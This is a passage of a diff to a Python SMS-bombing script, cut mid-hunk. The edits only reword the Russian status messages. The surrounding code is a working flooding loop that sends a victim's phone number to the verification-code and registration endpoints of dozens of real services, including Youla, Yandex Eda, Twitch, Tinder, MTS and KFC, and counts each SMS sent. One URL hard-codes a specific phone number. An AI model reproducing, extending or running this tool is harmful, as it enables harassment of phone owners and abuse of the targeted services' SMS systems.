         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -4657,11 +4657,11 @@ if call == str(2):
             R = R + 1
             print('[+] wowworks отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -4670,22 +4670,22 @@ if call == str(2):
             R = R + 1
             print('[+] Eda.Yandex отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
             R = R + 1
             print('[+] Youla отправлено! || Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -4695,33 +4695,33 @@ if call == str(2):
             R = R + 1
             print('[+] Alpari отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
             R = R + 1
             print('[+] SMS отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
             R = R + 1
             print('[+] Delivery отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://passport.twitch.tv/register?trusted_request=true',
@@ -4732,10 +4732,10 @@ if call == str(2):
             print('[+] Twitch отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
@@ -4744,10 +4744,10 @@ if call == str(2):
             print('[+] CabWiFi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
@@ -4755,10 +4755,10 @@ if call == str(2):
             print('[+] wowworks отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
@@ -4767,10 +4767,10 @@ if call == str(2):
             print('[+] Eda.Yandex отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
@@ -4778,10 +4778,10 @@ if call == str(2):
             print('[+] Youla отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -4791,10 +4791,10 @@ if call == str(2):
             print('[+] Alpari отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
@@ -4802,10 +4802,10 @@ if call == str(2):
             print('[+] SMS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
@@ -4814,10 +4814,10 @@ if call == str(2):
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
             print('[+] Grab отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
             requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                           data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
@@ -4826,7 +4826,7 @@ if call == str(2):
             time.sleep(1)
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
@@ -4834,10 +4834,10 @@ if call == str(2):
             print('[+] RuTaxi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] Не отправлено !')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
@@ -4845,10 +4845,10 @@ if call == str(2):
             print('[+] BelkaCar отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] Не отправленo !')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://starpizzacafe.com/mods/a.function.php',
@@ -4857,10 +4857,10 @@ if call == str(2):
             print('[+] StarPizzaCafe отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -4869,10 +4869,10 @@ if call == str(2):
             print('[+] Tinder отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
@@ -4880,10 +4880,10 @@ if call == str(2):
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -4892,10 +4892,10 @@ if call == str(2):
             print('[+] Tinkoff отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -4904,10 +4904,10 @@ if call == str(2):
             print('[+] Dostavista отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -4917,10 +4917,10 @@ if call == str(2):
             print('[+] MonoBank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -4929,10 +4929,10 @@ if call == str(2):
             print('[+] binotel отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32',
@@ -4941,10 +4941,10 @@ if call == str(2):
             print('[+] SportMaster отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -4953,10 +4953,10 @@ if call == str(2):
             print('[+] Alfalife отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
@@ -4964,10 +4964,10 @@ if call == str(2):
             print('[+] KoronaPay отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://silpo.ua/graphql', data={
@@ -4977,10 +4977,10 @@ if call == str(2):
             print('[+] Silpo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone, })
@@ -4988,10 +4988,10 @@ if call == str(2):
             print('[+] BTfair отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ggbet.ru/api/auth/register-with-phone',
@@ -5001,10 +5001,10 @@ if call == str(2):
             print('[+] GGbet отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-]  не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.etm.ru/cat/runprog.html',
@@ -5014,10 +5014,10 @@ if call == str(2):
             print('[+] ETM отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -5026,10 +5026,10 @@ if call == str(2):
             print('[+] TheLive отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
@@ -5037,10 +5037,10 @@ if call == str(2):
             print('[+] MTS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
@@ -5051,7 +5051,7 @@ if call == str(2):
             print('[+] error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://zoloto585.ru/api/bcard/reg/',
@@ -5062,10 +5062,10 @@ if call == str(2):
             print('[+] Zoloto585 отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone})
@@ -5073,10 +5073,10 @@ if call == str(2):
             print('[+] Kasta отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] Kasta Не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/',
@@ -5085,10 +5085,10 @@ if call == str(2):
             print('[+] Тaxi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -5098,10 +5098,10 @@ if call == str(2):
             print('[+] Mail.ru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.creditter.ru/confirm/sms/send',
@@ -5110,10 +5110,10 @@ if call == str(2):
             print('[+] Creditter отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2',
@@ -5126,10 +5126,10 @@ if call == str(2):
             print('[+] Ingos отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://win.1admiralxxx.ru/api/en/register.json',
@@ -5139,10 +5139,10 @@ if call == str(2):
             print('[+] Admiralxxx отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
@@ -5150,10 +5150,10 @@ if call == str(2):
             print('[+] Av отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
@@ -5162,10 +5162,10 @@ if call == str(2):
             print('[+] MTS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
@@ -5173,10 +5173,10 @@ if call == str(2):
             print('[+] City24 отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
@@ -5184,10 +5184,10 @@ if call == str(2):
             print('[+] SushiMaster отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
@@ -5195,10 +5195,10 @@ if call == str(2):
             print('[+] MultiPlex отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone})
@@ -5206,10 +5206,10 @@ if call == str(2):
             print('[+] 3040 отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.niyama.ru/ajax/sendSMS.php',
@@ -5218,10 +5218,10 @@ if call == str(2):
             print('[+] Niyama отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] Niyama не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
@@ -5229,10 +5229,10 @@ if call == str(2):
             print('[+] VSK отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] VSK не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})
@@ -5240,10 +5240,10 @@ if call == str(2):
             print('[+] EasyPay отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://fix-price.ru/ajax/register_phone_code.php',
@@ -5252,10 +5252,10 @@ if call == str(2):
             print('[+] Fix-Price отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.nl.ua', data={"component": "bxmaker.authuserphone.login",
@@ -5265,10 +5265,10 @@ if call == str(2):
             print('[+] NovaLinia отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})
@@ -5276,10 +5276,10 @@ if call == str(2):
             print('[+] Tele2 отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
@@ -5287,10 +5287,10 @@ if call == str(2):
             print('[+] Finam отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://makimaki.ru/system/callback.php',
@@ -5299,10 +5299,10 @@ if call == str(2):
             print('[+] MakiMaki отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.flipkart.com/api/6/user/signup/status',
@@ -5313,10 +5313,10 @@ if call == str(2):
             print('[+] FlipKart отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
@@ -5324,10 +5324,10 @@ if call == str(2):
             print('[+] Online.ua отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
@@ -5335,10 +5335,10 @@ if call == str(2):
             print('[+] PlanetaKino отправлено!')
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ontaxi.com.ua/api/v2/web/client',
@@ -5347,10 +5347,10 @@ if call == str(2):
             print('[+] OnTaxi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
@@ -5358,10 +5358,10 @@ if call == str(2):
             print('[+] Iqos отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://smart.space/api/users/request_confirmation_code/',
@@ -5370,10 +5370,10 @@ if call == str(2):
             print('[+] Smart.Space отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
@@ -5381,10 +5381,10 @@ if call == str(2):
             print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
